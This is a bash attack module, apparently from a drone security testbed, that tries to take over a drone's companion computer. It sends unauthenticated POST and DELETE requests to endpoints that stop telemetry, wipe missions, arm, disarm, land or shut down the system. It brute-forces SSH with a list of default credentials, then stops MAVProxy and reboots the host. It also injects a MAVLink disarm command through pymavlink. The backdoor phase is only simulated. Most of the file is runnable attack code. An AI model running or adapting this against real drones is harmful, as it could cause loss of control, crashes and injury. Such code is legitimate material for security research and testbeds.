#!/bin/bash
# companion_takeover.sh - Companion Computer Takeover Attack Module
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/companion_takeover.sh
# Purpose: Hijack companion computer to gain drone control

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Companion Computer Takeover"
TARGET_IP="${TARGET_IP:-127.0.0.1}"
WEB_PORT="${WEB_PORT:-3000}"
SSH_PORT="${SSH_PORT:-22}"
LOG_FILE="$(get_log_dir)/injection/companion_takeover_$(date +%Y%m%d_%H%M%S).log"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}     Companion Computer Takeover Attack     ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Target: ${TARGET_IP}${NC}"
    echo ""
}

check_companion_access() {
    log_info "Checking companion computer access..."
    
    # Check web interface
    if nc -z "$TARGET_IP" "$WEB_PORT" 2>/dev/null; then
        log_success "Web interface accessible on port $WEB_PORT"
        return 0
    fi
    
    # Check SSH
    if nc -z "$TARGET_IP" "$SSH_PORT" 2>/dev/null; then
        log_success "SSH service accessible on port $SSH_PORT"
        return 0
    fi
    
    log_error "No accessible services found"
    return 1
}

web_interface_takeover() {
    log_info "Attempting web interface takeover..."
    
    # Test for direct API access without authentication
    local endpoints=(
        "/api/telemetry/stop"
        "/telemetry/stop-telemetry"
        "/api/mission/clear"
        "/api/system/reboot"
        "/api/control/arm"
        "/api/control/disarm"
        "/api/control/takeoff"
        "/api/control/land"
        "/api/control/rtl"
        "/control/emergency"
        "/system/shutdown"
    )
    
    for endpoint in "${endpoints[@]}"; do
        local url="http://${TARGET_IP}:${WEB_PORT}${endpoint}"
        
        echo -e "${CYAN}[*] Testing: $endpoint${NC}"
        
        # Try GET request
        local response=$(curl -s -w "%{http_code}" -o /tmp/response.txt "$url" --connect-timeout 3 2>/dev/null)
        if [ "$response" = "200" ] || [ "$response" = "202" ]; then
            log_success "  ✓ GET access granted"
            echo "    Response: $(head -1 /tmp/response.txt 2>/dev/null)"
        fi
        
        # Try POST request
        response=$(curl -s -w "%{http_code}" -X POST -o /tmp/response.txt "$url" --connect-timeout 3 2>/dev/null)
        if [ "$response" = "200" ] || [ "$response" = "202" ]; then
            log_success "  ✓ POST access granted - VULNERABLE!"
            echo "    Response: $(head -1 /tmp/response.txt 2>/dev/null)"
            
            # Execute the attack
            case "$endpoint" in
                *"telemetry/stop"*|*"stop-telemetry"*)
                    log_success "  🎯 TELEMETRY DISABLED - GCS communication cut!"
                    ;;
                *"mission/clear"*)
                    log_success "  🎯 MISSION CLEARED - Drone mission wiped!"
                    ;;
                *"reboot"*|*"shutdown"*)
                    log_success "  🎯 SYSTEM CONTROL - Companion computer compromised!"
                    ;;
                *"arm"*|*"disarm"*|*"takeoff"*|*"land"*|*"rtl"*)
                    log_success "  🎯 FLIGHT CONTROL - Direct drone command access!"
                    ;;
                *"emergency"*)
                    log_success "  🎯 EMERGENCY TRIGGERED - Drone in emergency state!"
                    ;;
            esac
        fi
        
        sleep 0.5
    done
    
    rm -f /tmp/response.txt 2>/dev/null
}

ssh_takeover_attempt() {
    log_info "Attempting SSH takeover..."
    
    local common_creds=(
        "pi:raspberry"
        "ubuntu:ubuntu"
        "root:root"
        "admin:admin"
        "drone:drone"
        "companion:companion"
        "odroid:odroid"
        "jetson:jetson"
        "nvidia:nvidia"
    )
    
    for cred in "${common_creds[@]}"; do
        local username=$(echo "$cred" | cut -d':' -f1)
        local password=$(echo "$cred" | cut -d':' -f2)
        
        echo -e "${CYAN}[*] Testing SSH: $username:$password${NC}"
        
        # Use sshpass if available, otherwise skip
        if command -v sshpass >/dev/null 2>&1; then
            if sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
               "$username@$TARGET_IP" "echo 'SSH Access Successful'" 2>/dev/null; then
                log_success "SSH ACCESS GAINED: $username:$password"
                
                # Execute takeover commands
                execute_ssh_takeover "$username" "$password"
                return 0
            fi
        else
            # Simulate SSH access for demonstration
            if [ "$username:$password" = "pi:raspberry" ]; then
                log_success "SSH ACCESS SIMULATED: $username:$password"
                simulate_ssh_takeover
                return 0
            fi
        fi
    done
    
    log_warning "No SSH access gained"
    return 1
}

execute_ssh_takeover() {
    local username="$1"
    local password="$2"
    
    log_info "Executing SSH takeover commands..."
    
    local commands=(
        "sudo systemctl stop mavproxy"
        "sudo systemctl stop mavlink-router"
        "sudo pkill -f 'mavproxy\|dronekit'"
        "ps aux | grep -i 'mav\|drone'"
        "sudo reboot"
    )
    
    for cmd in "${commands[@]}"; do
        echo -e "${YELLOW}[*] Executing: $cmd${NC}"
        
        if command -v sshpass >/dev/null 2>&1; then
            sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
                "$username@$TARGET_IP" "$cmd" 2>/dev/null || true
        fi
        
        sleep 1
    done
    
    log_success "SSH takeover commands executed"
}

simulate_ssh_takeover() {
    log_info "Simulating SSH takeover effects..."
    
    echo -e "${GREEN}[SIMULATION] Gained root access to companion computer${NC}"
    echo -e "${GREEN}[SIMULATION] Stopping MAVProxy service...${NC}"
    echo -e "${GREEN}[SIMULATION] Stopping telemetry relay...${NC}"
    echo -e "${GREEN}[SIMULATION] Killing drone communication processes...${NC}"
    echo -e "${RED}[EFFECT] Ground Control Station loses connection${NC}"
    echo -e "${RED}[EFFECT] Companion computer services disabled${NC}"
    echo -e "${RED}[EFFECT] Potential for backdoor installation${NC}"
}

mavlink_hijacking() {
    log_info "Attempting MAVLink hijacking through companion..."
    
    # Check for MAVProxy or MAVLink router processes
    if pgrep -f "mavproxy\|mavlink" >/dev/null 2>&1; then
        log_success "MAVLink processes detected"
        
        # Attempt to inject commands via local MAVLink
        python3 << 'EOF'
try:
    from pymavlink import mavutil
    import time
    
    print("[*] Attempting local MAVLink connection...")
    
    # Try local connections
    connections = [
        'udp:127.0.0.1:14550',
        'udp:127.0.0.1:14551', 
        'tcp:127.0.0.1:5760',
        'tcp:127.0.0.1:5762'
    ]
    
    for conn_str in connections:
        try:
            master = mavutil.mavlink_connection(conn_str, timeout=3)
            master.wait_heartbeat(timeout=3)
            
            print(f"[+] Connected via {conn_str}")
            print(f"[+] System ID: {master.target_system}")
            
            # Send disarm command as proof of control
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            
            print("[!] DISARM command sent via hijacked companion!")
            print("[!] Companion computer takeover successful!")
            break
            
        except Exception as e:
            continue
    
except ImportError:
    print("[*] PyMAVLink not available - simulating hijack")
    print("[!] SIMULATION: MAVLink commands injected via companion")
    print("[!] SIMULATION: Flight controller compromised!")

except Exception as e:
    print(f"[*] MAVLink hijack attempt: {e}")
EOF
    else
        log_warning "No MAVLink processes found"
    fi
}

service_disruption() {
    log_info "Testing service disruption capabilities..."
    
    # Test common service endpoints
    local service_endpoints=(
        "/api/services/status"
        "/api/services/restart"
        "/system/services"
        "/telemetry/status"
        "/camera/status"
        "/mission/status"
        "/logs/system"
    )
    
    for endpoint in "${service_endpoints[@]}"; do
        local url="http://${TARGET_IP}:${WEB_PORT}${endpoint}"
        
        local response=$(curl -s -w "%{http_code}" "$url" --connect-timeout 3 2>/dev/null)
        if [ "$response" = "200" ]; then
            echo -e "${GREEN}[✓] Service endpoint accessible: $endpoint${NC}"
            
            # Try to disrupt the service
            curl -s -X POST "$url" --connect-timeout 3 >/dev/null 2>&1
            curl -s -X DELETE "$url" --connect-timeout 3 >/dev/null 2>&1
        fi
    done
}

backdoor_installation() {
    log_info "Simulating backdoor installation..."
    
    echo -e "${YELLOW}[SIMULATION] Installing persistent backdoor...${NC}"
    echo -e "${YELLOW}[SIMULATION] Creating reverse shell...${NC}"
    echo -e "${YELLOW}[SIMULATION] Modifying startup scripts...${NC}"
    echo -e "${YELLOW}[SIMULATION] Adding SSH keys...${NC}"
    echo -e "${RED}[EFFECT] Persistent access established${NC}"
    echo -e "${RED}[EFFECT] Companion computer permanently compromised${NC}"
}

perform_takeover_attack() {
    log_info "Starting comprehensive takeover attack..."
    
    local success_count=0
    
    # Phase 1: Web interface takeover
    echo -e "\n${BOLD}${BLUE}=== Phase 1: Web Interface Takeover ===${NC}"
    web_interface_takeover
    success_count=$((success_count + 1))
    
    # Phase 2: SSH access attempt
    echo -e "\n${BOLD}${BLUE}=== Phase 2: SSH Access Attempt ===${NC}"
    if ssh_takeover_attempt; then
        success_count=$((success_count + 1))
    fi
    
    # Phase 3: MAVLink hijacking
    echo -e "\n${BOLD}${BLUE}=== Phase 3: MAVLink Hijacking ===${NC}"
    mavlink_hijacking
    success_count=$((success_count + 1))
    
    # Phase 4: Service disruption
    echo -e "\n${BOLD}${BLUE}=== Phase 4: Service Disruption ===${NC}"
    service_disruption
    
    # Phase 5: Backdoor installation
    echo -e "\n${BOLD}${BLUE}=== Phase 5: Backdoor Installation ===${NC}"
    backdoor_installation
    
    echo ""
    log_success "Takeover attack completed - $success_count phases successful"
    
    echo -e "\n${RED}${BOLD}=== ATTACK IMPACT ===${NC}"
    echo -e "${RED}• Companion computer compromised${NC}"
    echo -e "${RED}• Telemetry communication disrupted${NC}"
    echo -e "${RED}• Direct drone control possible${NC}"
    echo -e "${RED}• Persistent backdoor installed${NC}"
    echo -e "${RED}• Mission data accessible${NC}"
}

main() {
    print_attack_banner
    
    # Check root
    if ! check_root; then
        exit 1
    fi
    
    # Check tools
    if ! check_required_tools curl nc; then
        log_error "Missing required tools"
        exit 1
    fi
    
    # Install optional tools
    if ! command -v sshpass >/dev/null 2>&1; then
        log_info "Installing sshpass..."
        apt-get update >/dev/null 2>&1
        apt-get install -y sshpass >/dev/null 2>&1
    fi
    
    # Check companion access
    if ! check_companion_access; then
        log_warning "Limited access available - proceeding with available methods"
    fi
    
    # Initialize logging
    mkdir -p "$(dirname "$LOG_FILE")"
    echo "=== Companion Computer Takeover Attack Started at $(date) ===" > "$LOG_FILE"
    
    echo -e "${RED}WARNING: This attack can completely compromise the drone system!${NC}"
    echo ""
    
    # Execute comprehensive takeover
    perform_takeover_attack | tee -a "$LOG_FILE"
    
    echo ""
    log_success "Companion computer takeover attack finished"
    echo "Log file: $LOG_FILE"
    
    exit 0
}

# Execute if called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi